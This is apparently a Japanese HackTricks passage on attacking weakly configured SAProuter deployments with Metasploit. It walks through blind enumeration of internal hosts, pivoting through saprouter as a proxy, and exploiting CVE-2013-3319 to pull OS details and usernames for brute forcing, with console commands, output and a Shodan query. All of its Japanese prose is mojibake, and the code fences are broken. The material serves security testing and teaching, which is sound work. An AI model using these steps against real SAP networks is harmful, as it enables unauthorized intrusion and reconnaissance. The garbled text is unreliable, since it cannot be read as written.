Saproutersã¯ã€æ¥ç¶šã‚’è¦æ±‚ã•ã‚ŒãŸãƒ›ã‚¹ãƒˆåã‚’è§£æ±ºã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚Saprouterã¯ã¾ãŸã€æ¥ç¶šã«å¤±æ•—ã—ãŸã¨ãã®ã‚¨ãƒ©ãƒ¼ã‚’æ•™ãˆã¦ãã‚Œã‚‹è¦ªåˆ‡ã•ã‚‚æŒã£ã¦ã„ã¾ã™ï¼ˆå®Ÿéš›ã®å¿œç­”ã‚’è¦‹ã‚‹ã«ã¯ã€ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚½ãƒ¼ã‚¹ã®242è¡Œç›®ã®ã‚³ãƒ¡ãƒ³ãƒˆã‚’å¤–ã—ã¦ãã ã•ã„ï¼‰ã€‚

ã“ã®æ©Ÿèƒ½ã‚’ä½¿ã£ã¦ã€ãƒ›ã‚¹ãƒˆåã«ã‚ˆã£ã¦å†…éƒ¨ãƒ›ã‚¹ãƒˆã‚’åˆ—æŒ™ã—ã€ç›´æ¥ã‚´ãƒ¼ãƒ«ã‚’ç›®æŒ‡ã™ã“ã¨ãŒã§ãã¾ã™ï¼

ã“ã‚Œã‚’è¡Œã†ã«ã¯ã€RESOLVEã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ã€Œremoteã€ã«è¨­å®šã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã®å ´åˆã€ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã¯å®šç¾©ã•ã‚ŒãŸTARGETSã¸ã®æ¥ç¶šã‚’è¦æ±‚ã—ã¾ã™ãŒã€ãƒ­ãƒ¼ã‚«ãƒ«ã§è§£æ±ºã›ãšã«ã€å†…éƒ¨ãƒ›ã‚¹ãƒˆã‚’æ¨æ¸¬ã—ã€IPã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ä¸€åˆ‡çŸ¥ã‚‰ãšã«æ¥ç¶šã‚’è©¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ãƒ›ã‚¹ãƒˆã‚’ãƒ–ãƒ©ã‚¤ãƒ³ãƒ‰ã«åˆ—æŒ™ã™ã‚‹éš›ã«è¦šãˆã¦ãŠãã¹ãé‡è¦ãªã“ã¨ï¼š

* VERBOSEã‚’trueã«è¨­å®šã™ã‚‹ï¼›
* MODEãŒSAP_PROTOã«è¨­å®šã•ã‚Œã¦ã„ã‚‹å ´åˆã€saprouterã‹ã‚‰ã‚ˆã‚Šå¤šãã®æƒ…å ±ã‚’å¾—ã‚‰ã‚Œã¾ã™ï¼›
* ã“ã®æ™‚ç‚¹ã§èˆˆå‘³ãŒã‚ã‚‹ã®ã¯saprouterã‹ã‚‰é€ã‚‰ã‚Œã‚‹æƒ…å ±ã ã‘ãªã®ã§ã€ã‚¹ã‚­ãƒ£ãƒ³ã™ã‚‹ãƒãƒ¼ãƒˆã¯1ã¤ã ã‘è¨­å®šã™ã‚Œã°ååˆ†ã§ã™ï¼ˆ3200ã‚’è©¦ã—ã¦ã¿ã¦ãã ã•ã„ï¼‰ï¼›
* çµæœã¯è¨­å®šã•ã‚ŒãŸACLã«ã‚ˆã£ã¦ç•°ãªã‚Šã¾ã™ã€‚æ®‹å¿µãªãŒã‚‰ãƒ–ãƒ­ãƒƒã‚¯ã•ã‚ŒãŸæ¥ç¶šã¯ã‚ã¾ã‚Šæƒ…å ±ã‚’ä¸ãˆã¦ãã‚Œã¾ã›ã‚“ã€‚

ã“ã®ä¾‹ã§ã¯ã€ãƒ›ã‚¹ãƒˆåsapã€sapsrvã€sapsrv2ã‚’è©¦ã—ã¦ã¿ã¾ã™ã€‚
```
```text
msf auxiliary(sap_router_portscanner) > set RESOLVE remote
RESOLVE => remote
msf auxiliary(sap_router_portscanner) > set MODE SAP_PROTO
MODE => SAP_PROTO
msf auxiliary(sap_router_portscanner) > set VERBOSE true
VERBOSE => true
msf auxiliary(sap_router_portscanner) > set TARGETS sap,sapsrv,sapsrv2
TARGETS => sap,sapsrv,sapsrv2
msf auxiliary(sap_router_portscanner) > set PORTS 3200
PORTS => 3200
msf auxiliary(sap_router_portscanner) > run

[*] Scanning sap
[-] sap:3200 - unknown host
[!] Warning: Service info could be inaccurate
[*] Scanning sapsrv
[-] sapsrv:3200 - host unreachable
[!] Warning: Service info could be inaccurate
[*] Scanning sapsrv2
[+] sapsrv2:3200 - TCP OPEN
[!] Warning: Service info could be inaccurate

Portscan Results
================

Host     Port  State  Info
----     ----  -----  ----
sapsrv2  3200  open   SAP Dispatcher sapdp00

[*] Auxiliary module execution completed
```
å‡ºåŠ›ã‹ã‚‰ã€ãƒ›ã‚¹ãƒˆ "sap" ã¯å­˜åœ¨ã—ãªã„ãŒã€sapsrv ã¯å­˜åœ¨ã™ã‚‹ãŒåˆ°é”ä¸å¯èƒ½ã§ã‚ã‚Šã€sapsrv2 ã¯å­˜åœ¨ã—ã€ãƒãƒ¼ãƒˆ 3200 ã«æ¥ç¶šã§ãã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚

ã“ã®æŠ€è¡“ã¯ã€SAP é–¢é€£ã§ã¯ãªã„ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®ä»–ã®ãƒ›ã‚¹ãƒˆã‚’è¦‹ã¤ã‘ã‚‹ãŸã‚ã«ã‚‚ä½¿ç”¨ã§ãã¾ã™ã€‚smtpã€exchangeã€pdcã€bdcã€fileshareã€intranet ãªã©ã®ä¸€èˆ¬çš„ãªãƒ›ã‚¹ãƒˆåã‚’è©¦ã—ã¦ã¿ã‚‹ã‹ã€ã‚ãªãŸã®ãƒˆãƒªãƒƒã‚¯ã®è¢‹ã«ã‚ã‚‹ä»–ã®ç´ æ•µãªãƒ›ã‚¹ãƒˆåã‚’ä½¿ç”¨ã—ã¦ã¿ã¦ãã ã•ã„ã€‚

**æœ€å¾Œã®ä¸€é‡Œ**

ã“ã‚Œã§ã€åˆ©ç”¨å¯èƒ½ãªå†…éƒ¨ãƒ›ã‚¹ãƒˆã€è¨±å¯ã•ã‚Œã¦ã„ã‚‹ã‚µãƒ¼ãƒ“ã‚¹ã€saprouter ã‚’çªç ´ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã‚‹ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ã™ã¹ã¦æŠŠæ¡ã—ãŸã®ã§ã€å®Ÿéš›ã«å†…éƒ¨ã‚µãƒ¼ãƒãƒ¼ã«æ¥ç¶šã—ã€ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆã‚’é€²ã‚ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

Metasploit ã¯ã€Dave Hartley ([@nmonkee](http://twitter.com/nmonkee)) ã®ãŠã‹ã’ã§ã€Proxies ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¦ saprouter ã‚’ãƒ—ãƒ­ã‚­ã‚·ã¨ã—ã¦ä½¿ç”¨ã™ã‚‹ç´ æ™´ã‚‰ã—ã„æ–¹æ³•ã‚’æä¾›ã—ã¦ã„ã¾ã™ã€‚

ã—ãŸãŒã£ã¦ã€ã“ã®æ™‚ç‚¹ã§ã€ç§ãŸã¡ã¯ç™ºè¦‹ã—ãŸå†…éƒ¨ sap ã‚µãƒ¼ãƒãƒ¼ã«é–¢ã™ã‚‹æƒ…å ±ã‚’åé›†ã—å§‹ã‚ãŸã„ã¨æ€ã„ã¾ã™ã€‚ä¾‹ã¨ã—ã¦ã€ãƒãƒ¼ãƒˆ 1128 ã§ SAP Host Control ã‚µãƒ¼ãƒ“ã‚¹ã«å¯¾ã—ã¦èªè¨¼ã•ã‚Œã¦ã„ãªã„ SOAP ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ä»‹ã—ã¦ã‚µãƒ¼ãƒãƒ¼ãŒå®Ÿè¡Œã—ã¦ã„ã‚‹ OS ã®è©³ç´°ã‚’æä¾›ã™ã‚‹ CVE-2013-3319 ã‚’æ‚ªç”¨ã™ã‚‹ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ« [`sap_hostctrl_getcomputersystem`](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_hostctrl_getcomputersystem) ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚saprouter ã‚’ä»‹ã—ã¦ãƒ”ãƒœãƒƒãƒˆã—ã€metasploit ã®ãƒ—ãƒ­ã‚­ã‚·ã‚µãƒãƒ¼ãƒˆã‚’ä½¿ç”¨ã—ã¾ã™ï¼š

![](https://blog.rapid7.com/content/images/post-images/33923/image2.jpg)
```text
msf auxiliary(sap_router_portscanner) > use auxiliary/scanner/sap/sap_hostctrl_getcomputersystem
msf auxiliary(sap_hostctrl_getcomputersystem) > set Proxies sapni:1.2.3.101:3299
Proxies => sapni:1.2.3.101:3299
msf auxiliary(sap_hostctrl_getcomputersystem) > set RHOSTS 192.168.1.18
RHOSTS => 192.168.1.18
msf auxiliary(sap_hostctrl_getcomputersystem) > run

[+] 192.168.1.18:1128 - Information retrieved successfully
[*] 192.168.1.18:1128 - Response stored in /Users/msfusr/.msf4/loot/20140107180827_default_192.168.1.18_sap.getcomputers_386124.xml (XML) and /Users/msfusr/.msf4/loot/20140107180827_default_192.168.1.18_sap.getcomputers_186948.txt (TXT)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
```
ã†ã¾ãã„ã‘ã°ã€å¯¾è±¡ã®SAPãƒ›ã‚¹ãƒˆã‹ã‚‰ã®èˆˆå‘³æ·±ã„å†…éƒ¨æƒ…å ±ï¼ˆä¾‹ãˆã°ã€ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹æ”»æ’ƒã‚’è©¦ã¿ã‚‹ã“ã¨ãŒã§ãã‚‹å†…éƒ¨ãƒ¦ãƒ¼ã‚¶ãƒ¼åãªã©ï¼‰ãŒå«ã¾ã‚Œã‚‹lootã®ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã®ç´ æ™´ã‚‰ã—ã„å‡ºåŠ›ãŒå¾—ã‚‰ã‚Œã¾ã™ã€‚

ãƒ”ãƒœãƒƒãƒˆã¯ï¼ˆãã—ã¦ã™ã¹ãã§ã™ï¼ï¼‰SAPã‚·ã‚¹ãƒ†ãƒ ã ã‘ã§ãªãã€å†…éƒ¨ãƒ›ã‚¹ãƒˆã«å¯¾ã—ã¦ä»–ã®ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã¾ã™ï¼

**çµè«–**

ç§ãŸã¡ã¯ã€ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã‹ã‚‰å…¨ã¦ã®å†…éƒ¨ãƒ›ã‚¹ãƒˆã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’è¨±å¯ã™ã‚‹å¯èƒ½æ€§ã®ã‚ã‚‹å¼±ã„saprouterè¨­å®šã‚’åˆ©ç”¨ã™ã‚‹æ–¹æ³•ã‚’è¦‹ã¦ãã¾ã—ãŸã€‚ã“ã‚Œã¯ã™ã¹ã¦ã€metasploitã®SAPã‚·ã‚¹ãƒ†ãƒ ã®pentestingã‚µãƒãƒ¼ãƒˆã‚’ä½¿ç”¨ã—ã¦ã®ã¿è¡Œã‚ã‚Œã¾ã™ã€‚

ã“ã®è¨˜äº‹ãŒsaprouterã®å±•é–‹ã«é–¢é€£ã™ã‚‹ãƒªã‚¹ã‚¯ã¨ã€ä¸€èˆ¬çš„ãªSAPã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®ä¸¡æ–¹ã«å…‰ã‚’å½“ã¦ã‚‹ã®ã«å½¹ç«‹ã¤ã“ã¨ã‚’é¡˜ã£ã¦ã„ã¾ã™ã€‚

**å‚ç…§è³‡æ–™**

* [http://labs.mwrinfosecurity.com/blog/2012/09/13/sap-smashing-internet-windows/](http://labs.mwrinfosecurity.com/blog/2012/09/13/sap-smashing-internet-windows/)
* \[[http://conference.hitb.org/hitbsecconf2010ams/materials/D2T2](http://conference.hitb.org/hitbsecconf2010ams/materials/D2T2) - Mariano Nun ez Di Croce - SAProuter .pdf\]\([http://conference.hitb.org/hitbsecconf2010ams/materials/D2T2](http://conference.hitb.org/hitbsecconf2010ams/materials/D2T2) - Mariano Nunez Di Croce - SAProuter .pdf\)
* [http://scn.sap.com/docs/DOC-17124](http://scn.sap.com/docs/DOC-17124)
* [http://help.sap.com/saphelp\_nw70/helpdata/EN/4f/992dfe446d11d189700000e8322d00/f rameset.htm](http://help.sap.com/saphelp_nw70/helpdata/EN/4f/992dfe446d11d189700000e8322d00/frameset.htm)
* [http://help.sap.com/saphelp\_dimp50/helpdata/En/f8/bb960899d743378ccb8372215bb767 /content.htm](http://help.sap.com/saphelp_dimp50/helpdata/En/f8/bb960899d743378ccb8372215bb767/content.htm)
* [http://labs.integrity.pt/advisories/cve-2013-3319/](http://labs.integrity.pt/advisories/cve-2013-3319/)
* [SAP Service Discovery \| Rapid7](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_service_discovery)
* [SAPRouter Admin Request \| Rapid7](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_router_info_request)
* [CVE-2013-3319 SAP Host Agent Information Disclosure \| Rapid7](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_hostctrl_getcomputersystem)
* [SAPRouter Port Scanner \| Rapid7](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_router_portscanner)

# Shodan

* `port:3299 !HTTP Network packet too big`



<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ã§AWSã®ãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ã€‚
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«**å‚åŠ ã™ã‚‹**ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚

</details>
```
